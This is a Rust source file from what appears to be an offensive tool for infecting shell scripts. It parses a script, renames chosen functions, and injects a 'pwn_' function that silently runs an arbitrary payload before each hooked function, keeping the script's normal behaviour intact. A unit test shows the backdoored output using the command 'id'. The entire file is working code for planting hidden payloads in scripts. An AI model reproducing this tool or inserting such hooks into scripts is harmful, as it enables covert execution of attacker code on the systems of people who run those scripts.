use crate::args;
use crate::errors::*;
use blake2::{Blake2b512, Digest};
use serde::{Deserialize, Serialize};
use std::num::NonZeroU64;
use std::rc::Rc;
use std::str;
use tokio::io::{AsyncWrite, AsyncWriteExt};
use yash_syntax::alias::AliasSet;
use yash_syntax::input::Memory;
use yash_syntax::parser::lex::Lexer;
use yash_syntax::parser::Parser;
use yash_syntax::source::Source;
use yash_syntax::syntax;

fn hash_script(script: &str) -> String {
    let mut hasher = Blake2b512::new();
    hasher.update(script.as_bytes());
    let res = hasher.finalize();
    hex::encode(&res[..6])
}

fn fn_name(name: &str) -> Result<syntax::Word> {
    name.parse::<syntax::Word>()
        .map_err(|err| anyhow!("Failed to create function name: {:#?}", err))
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Infect {
    pub payload: String,
    pub hook_functions: Vec<String>,
}

impl Infect {
    pub fn should_hook_fn(&self, function: &str) -> bool {
        self.hook_functions.iter().any(|x| x == function)
    }
}

impl TryFrom<args::InfectSh> for Infect {
    type Error = Error;

    fn try_from(args: args::InfectSh) -> Result<Self> {
        Ok(Infect {
            payload: args.payload,
            hook_functions: args.hooks,
        })
    }
}

pub async fn infect<W: AsyncWrite + Unpin>(
    config: &Infect,
    script: &[u8],
    out: &mut W,
) -> Result<()> {
    let script = str::from_utf8(script).context("Failed to decode script as utf8")?;

    let hash = hash_script(script);

    // First, prepare an input object that the lexer reads from.
    let input = Box::new(Memory::new(script));

    // Next, create a lexer.
    let line = NonZeroU64::new(1).unwrap();
    let mut lexer = Lexer::new(input, line, Source::Unknown);

    // Then, create a new parser borrowing the lexer.
    let aliases = AliasSet::new();
    let mut parser = Parser::new(&mut lexer, &aliases);

    let mut installed_pwn_function = false;

    loop {
        let line = parser
            .command_line()
            .await
            .map_err(|err| anyhow!("Failed to parse line in shell script: {:#?}", err))?;
        let Some(mut line) = line else { break };

        let mut install_hooks = Vec::new();
        for item in &mut line.0 {
            if let Some(and_or) = Rc::get_mut(&mut item.and_or) {
                for cmd in &mut and_or.first.commands {
                    if let Some(syntax::Command::Function(fun)) = Rc::get_mut(cmd) {
                        let name = fun.name.to_string();
                        if config.should_hook_fn(&name) {
                            let patched_name = format!("{}_{}", name, hash);
                            let word = fn_name(&patched_name)?;
                            debug!("Found function {:?}: {:?}", name, fun.body.to_string());
                            fun.name = word;
                            install_hooks.push((name, patched_name));
                        }
                    }
                }
            }
        }
        for (name, patched_name) in install_hooks {
            if !installed_pwn_function {
                out.write_all(
                    format!(
                    "pwn_{hash}() {{ test -n \"$pwned_{hash}\" && return; pwned_{hash}=1; {}; }}\n",
                    config.payload,
                    hash = hash,
                )
                    .as_bytes(),
                )
                .await?;
                installed_pwn_function = true;
            }
            out.write_all(
                format!(
                    "{}() {{ pwn_{hash}; {} \"$@\"; }}\n",
                    name,
                    patched_name,
                    hash = hash
                )
                .as_bytes(),
            )
            .await?;
        }
        out.write_all(format!("{}\n", line).as_bytes()).await?;
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_simple_infect() -> Result<()> {
        let mut buf = Vec::new();
        infect(
            &Infect {
                payload: "id".to_string(),
                hook_functions: vec!["foo".to_string()],
            },
            b"echo 1
foo() {
echo 3
}

# this is a comment
# this is another comment
echo 2
foo
",
            &mut buf,
        )
        .await?;
        let script = String::from_utf8(buf)?;
        assert_eq!(
            script,
            "echo 1
pwn_a776077c0b8e() { test -n \"$pwned_a776077c0b8e\" && return; pwned_a776077c0b8e=1; id; }
foo() { pwn_a776077c0b8e; foo_a776077c0b8e \"$@\"; }
foo_a776077c0b8e() { echo 3; }



echo 2
foo
"
        );
        Ok(())
    }
}
